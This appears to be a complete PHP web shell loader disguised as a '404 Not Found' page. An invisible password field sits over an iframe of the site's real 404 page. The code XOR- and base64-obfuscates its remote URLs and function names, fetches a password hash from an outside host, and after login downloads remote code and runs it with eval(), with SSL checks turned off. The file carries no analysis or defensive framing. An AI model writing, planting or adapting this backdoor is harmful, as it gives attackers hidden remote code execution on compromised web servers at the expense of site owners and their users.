<?php
function is_logged_in() {
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user@localhost';
}

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

function xor_encrypt($data, $key = 'myXORkey') {
    $output = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $output .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return $output;
}

function decrypt_data($base64, $key = 'myXORkey') {
    $xor = base64_decode($base64);
    $hex = xor_encrypt($xor, $key);
    return hex2str($hex);
}

function get_remote_content($url) {
    $f = [
        decrypt_data("GAkHA0EZUg5U", 'myXORkey'),
        decrypt_data("UhkWWl8MEgoSVV0dD1pSQlsTUFk=", 'myXORkey'),
        decrypt_data("WB4NWF1eFlNKTVcQRFlaVEk=", 'myXORkey'),
        decrypt_data("Gk9dA19RWEIMTQ==", 'myXORkey')
    ];

    list($fopen, $stream_get, $file_get, $curl_exec) = $f;

    if (function_exists($curl_exec)) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_USERAGENT => "Mozilla/5.0",
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_SSL_VERIFYHOST => 0
        ]);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    } elseif (function_exists($file_get)) {
        return $file_get($url);
    } elseif (function_exists($fopen) && function_exists($stream_get)) {
        $handle = $fopen($url, "r");
        $result = $stream_get($handle);
        fclose($handle);
        return $result;
    }
    return false;
}

$k_b64 = "EA0fDR4fB10VFlJZXlc=";
$password_hash_url_key = decrypt_data($k_b64);

$u_b64 = "GkxeE09AAlpdEk5AWQkdFA9SGllRFxUMS1IW";
$password_hash_url = decrypt_data($u_b64);

$hashed_key = trim(get_remote_content($password_hash_url));

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
    $entered_key = $_POST['pass'];
    if (password_verify($entered_key, $hashed_key)) {
        setcookie('user_id', 'user@localhost', time() + 3600, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

if (is_logged_in()) {
    $p = decrypt_data("FgUKCkAKGw==");
    $h = decrypt_data("GkxeE09A", 'myXORkey');
    $l = decrypt_data("DQYXHkUAK1kfFgkBC11TD1YWT1UVRws=", 'myXORkey');

    $url = hex2str($p) . "://" . hex2str($h) . "/" . hex2str($l);
    $code = get_remote_content($url);
    if ($code !== false) {
        eval("?>".$code);
    }
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <meta name="robots" content="noindex,nofollow">
    <style>
        html, body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            width: 100%;
            height: 100%;
        }
        body {
            font-family: sans-serif;
        }
        form {
            position: absolute;
            top: 10px;
            left: 10px;
            z-index: 9999;
        }
        input[type=password] {
            background: transparent;
            border: none;
            outline: none;
            color: black;
            caret-color: black;
            font-size: 14px;
            width: 120px;
            height: 20px;
            opacity: 1;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            border: none;
            width: 100%;
            height: 100%;
        }
        #hiddenWrap {
            visibility: hidden;
            position: absolute;
            left: -9999px;
        }
    </style>
</head>
<body>
    <div id="hiddenWrap">
        <form method="post" id="loginForm">
            <input type="password" name="pass" id="passInput" autocomplete="off">
            <input type="submit" name="watching" value="submit" style="display:none;">
        </form>
    </div>

    <iframe src="//<?php echo $_SERVER['SERVER_NAME']; ?>/404" 
        id="iframe_id" 
        onload="document.title=this.contentDocument ? this.contentDocument.title : this.contentWindow.document.title;">
    </iframe>

    <script>
        window.onload = () => {
            const wrap = document.getElementById('hiddenWrap');
            document.body.appendChild(wrap.firstElementChild);
            wrap.remove();

            const input = document.getElementById('passInput');
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    document.getElementById('loginForm').submit();
                }
            });
        };
    </script>
</body>
</html>
